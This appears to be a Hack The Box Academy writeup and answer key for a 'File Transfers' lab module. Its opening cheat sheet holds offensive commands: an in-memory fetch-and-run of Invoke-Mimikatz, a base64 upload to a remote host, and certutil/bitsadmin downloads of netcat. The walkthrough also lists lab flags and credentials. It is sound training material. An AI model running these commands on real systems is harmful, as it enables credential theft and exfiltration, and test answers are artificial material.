
| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
|  `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                           | Download a file with PowerShell             |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

# File Transfers Module

## Section Questions Writeup

#### **Tier**: 0

#### **Difficulty**: Medium

#### **Type**: Offensive

#### **Created By**: PlainText

#### **Co-Authors**: mrb3n

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Windows File Transfer Methods|Question 1|b1a4ca918282fcd96004565521944a3b|
|Windows File Transfer Methods|Question 2|f458303ea783c224c6b4e7ef7f17eb9d|
|Linux File Transfer Methods|Question 1|5d21cf3da9c0ccb94f709e2559f3ea50|
|Linux File Transfer Methods|Question 2|159cfe5c65054bbadb2761cfa359c8b0|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Windows File Transfer Methods

## Question 1

### "Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer."

Many approaches can be taken to solve this question.

A first approach is whereby students use the .NET `System.Net.WebClient DownloadFile` method through the `PowerShell` terminal provided in `Pwnbox`/`PMVPN` (the second parameter of the method must be changed accordingly to match an existing directory name, followed by the name to be given for the downloaded file):

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://STMIP/flag.txt', "/home/htb-ac413848/flag.txt")
```

```powershell-session
┌[htb-mwcr7xr7fn@htb-ac413848]-[11:07-14/10]-[/home/htb-ac413848]
└╼$ (New-Object System.Net.WebClient).DownloadFile('http://10.129.201.55/flag.txt', '/home/htb-ac413848/flag.txt')
```

Another approach is by using `wget`:

```powershell
wget http://STMIP/flag.txt
```

```powershell-session
┌[htb-mwcr7xr7fn@htb-ac413848]-[11:07-14/10]-[/home/htb-ac413848]
└╼$ wget http://10.129.201.55/flag.txt

2022-02-22 12:50:20 (3.43 MB/s) - ‘flag.txt’ saved [32/32]
```

Students then need to print out the contents of the flag file "flag.txt", finding it to be `b1a4ca918282fcd96004565521944a3b`:

```powershell
type ./flag.txt
```

```powershell-session
┌[htb-mwcr7xr7fn@htb-ac413848]-[11:07-14/10]-[/home/htb-ac413848]
└╼$ type ./flag.txt

b1a4ca918282fcd96004565521944a3b
```

Answer: `b1a4ca918282fcd96004565521944a3b`

# Windows File Transfer Methods

## Question 2

### "Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer."

Students first need to download the [upload_win.zip](https://academy.hackthebox.com/storage/modules/24/upload_win.zip) file into `Pwnbox`/`PMVPN` using `wget`:

```shell
wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip
```

```shell-session
┌[htb-mwcr7xr7fn@htb-ac413848]-[11:07-14/10]-[/home/htb-ac413848]
└╼$ wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip

--2022-02-22 13:09:45-- https://academy.hackthebox.com/storage/
modules/24/upload_win.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)
104.18.20.126, 104.18.21.126
Connecting to academy.hackthebox.com (academy.hackthebox.com)
|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/zip]
Saving to: ‘upload_win.zip’

upload_win.zip	100%[=================>]  194  --.-KB/s in 0s      

2022-02-22 13:09:46 (3.60 MB/s)-‘upload_win.zip’saved [194/194]
```

Then, students need to RDP into the spawned Windows target by using any Remote Desktop Protocol (RDP) client, such as `xfreerdp` (it is important that students provide as input `Y`, when prompted for the certificate trust), using the credentials `htb-student:HTB_@cademy_stdnt!`:

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ xfreerdp /v:10.129.201.55 /u:htb-student /p:HTB_@cademy_stdnt!

[13:14:44:883] [3689:3690] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
<SNIP>
[13:14:44:299] [3689:3690] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
<SNIP>
Do you trust the above certificate? (Y/T/N) Y
```

![File_Transfers_image_1.png](https://academy.hackthebox.com/storage/walkthroughs/20/File_Transfers_image_1.png)

Subsequently, students need to start an HTTP server on `Pwnbox`/`PMVPN` in the same directory where the "upload_win.zip" file was downloaded:

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ python3 -m http.server PWNPO

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Students then need to transfer the "upload_win.zip" file from `Pwnbox`/`PMVPN` to the spawned Windows target machine using `iwr`:

```powershell
iwr http://PWNIP:PWNPO/upload_win.zip -OutFile upload_win.zip
```

```powershell-session
PS C:\Users\htb-student\Desktop> iwr http://10.10.15.151:8080/upload_win.zip -OutFile upload_win.zip
```

![File_Transfers_image_2.png](https://academy.hackthebox.com/storage/walkthroughs/20/File_Transfers_image_2.png)

After successfully transferring the file, students need to unzip it, and at last, use `hasher.exe` on "upload_win.txt", to attain the flag `f458303ea783c224c6b4e7ef7f17eb9d`:

```powershell
Expand-Archive .\upload_win.zip
hasher.exe .\upload_win\upload_win.txt
```

```powershell-session
PS C:\Users\htb-student\Desktop> Expand-Archive .\upload_win.zip
PS C:\Users\htb-student\Desktop> hasher.exe .\upload_win\upload_win.txt

f458303ea783c224c6b4e7ef7f17eb9d
```

Answer: `f458303ea783c224c6b4e7ef7f17eb9d`

# Windows File Transfer Methods

## Question 3

### "Connect to the target machine via RDP and practice various file transfer operations (upload and download) with your attack host. Type "DONE" when finished."

Students are highly encouraged to practice various file transfer operations with the myriad of methods demonstrated in the section then, once done, type `DONE`.

Answer: `DONE`

# Linux File Transfer Methods

## Question 1

### "Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer."

Using Python, students need to utilize the `urlretrieve` function from the `urllib.request` module to download the file from the spawned target machine:

```shell
python3
import urllib.request as request
request.urlretrieve("http://STMIP/flag.txt", "flag.txt");
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
>>> import urllib.request as request
>>> request.urlretrieve("http://10.129.181.183/flag.txt", "flag.txt");
('flag.txt', <http.client.HTTPMessage object at 0x7f7585d7b160>)
```

Then, students need to read the contents of the file, to attain the flag `5d21cf3da9c0ccb94f709e2559f3ea50`:

```shell
cat flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ cat flag.txt

5d21cf3da9c0ccb94f709e2559f3ea50
```

Answer: `5d21cf3da9c0ccb94f709e2559f3ea50`

# Linux File Transfer Methods

## Question 2

### "Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, unzip the file, and run "hasher upload_nix.txt" from the command line. Submit the generated hash as your answer."

Students first need to SSH into the spawned target machine using the credentials `htb-student:HTB_@cademy_stdnt!`:

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ ssh htb-student@10.129.181.183

htb-student@10.129.181.183's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-47-generic x86_64)

<SNIP>

htb-student@nix04:~$
```

Then, students need to download the [upload_nix.zip](https://academy.hackthebox.com/storage/modules/24/upload_nix.zip) file into `Pwnbox`/`PMVPN` using `wget` and then unzip it:

```shell
wget https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
unzip upload_nix.zip
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/24/upload_nix.zip

--2022-02-22 14:13:47--  https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/zip]
Saving to: ‘upload_nix.zip’

upload_nix.zip	100%[=================>]  194  --.-KB/s in 0s      
2022-02-22 14:13:47 (2.64 MB/s) - ‘upload_nix.zip’ saved [194/194]

┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ unzip upload_nix.zip

Archive:  upload_nix.zip
extracting: upload_nix.txt
```

Subsequently, students need to transfer the "upload_nix.txt" file from `Pwnbox`/`PMVPN` to the Linux spawned target machine. A first method is whereby students use `scp` (i.e., `OpenSSH secure file copy`), utilizing the credentials `htb-student:HTB_@cademy_stdnt!`:

```shell
scp upload_nix.txt htb-student@STMIP:~/
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ scp upload_nix.txt htb-student@10.129.181.183:~/

htb-student@10.129.181.183's password: 
upload_nix.txt	100%   32    10.3KB/s   00:00
```

Another easy and quick method is whereby students use `nc`. First, the receiving host (i.e. the Linux spawned target machine) listens on a port and redirects the input it receives (which is "upload_nix.txt" in this case):

```shell
nc -lp STMPO > upload_nix.txt
```

```shell-session
htb-student@nix04:~$ nc -lp 9999 > upload_nix.txt
```

Then, the sending host (i.e. `Pwnbox`/`PMVPN`) sends the "upload_nix.txt" file by redirecting it as output through the `nc` connection socket:

```shell
nc -w 3 STMIP STMPO < upload_nix.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@htb-mwcr7xr7fn]─[~]
└──╼ [★]$ nc -w 3 10.129.181.183 9999 < upload_nix.txt
```

At last, students need to use `hasher` on the "upload_nix.txt" file, to attain the flag `159cfe5c65054bbadb2761cfa359c8b0`:

```shell-session
hasher upload_nix.txt
```

```shell-session
htb-student@nix04:~$ hasher upload_nix.txt

159cfe5c65054bbadb2761cfa359c8b0
```

Answer: `159cfe5c65054bbadb2761cfa359c8b0`

# Linux File Transfer Methods

## Question 3

### "Connect to the target machine via SSH and practice various file transfer operations (upload and download) with your attack host. Type "DONE" when finished."

Students are highly encouraged to practice various file transfer operations with the myriad of methods demonstrated in the section, then once done, type `DONE`.

Answer: `DONE`

# Transferring Files with Code

## Question 1

### "Connect to the target machine via SSH (Username: htb-student | Password:HTB_@cademy_stdnt!) and practice various file transfer operations (upload and download) with your attack host. Type "DONE" when finished."

Students are highly encouraged to practice various file transfer operations with the myriad of methods demonstrated in the section, then once done, type `DONE`.

Answer: `DONE`

# Miscellaneous File Transfer Methods

## Question 1

### "Use xfreerdp or rdesktop to connect to the target machine via RDP (Username: htb-student | Password:HTB_@cademy_stdnt!) and mount a Linux directory to practice file transfer operations (upload and download) with your attack host. Type "DONE" when finished."

Students are highly encouraged to practice various file transfer operations with the myriad of methods demonstrated in the section then, once done, type `DONE`.

Answer: `DONE`

# Living off The Land

## Question 1

### "Connect to the target machine via RDP ((Username: htb-student | Password:HTB_@cademy_stdnt!)) and use Living Off The Land techniques presented in this section or any other found on the LOLBAS and GTFOBins websites to transfer files between the Pwnbox and the Windows target. Type "DONE" when finished."

Students are highly encouraged to use Living Off The Land techniques to practice various file transfer operations, and once done, type `DONE`.

Answer: `DONE`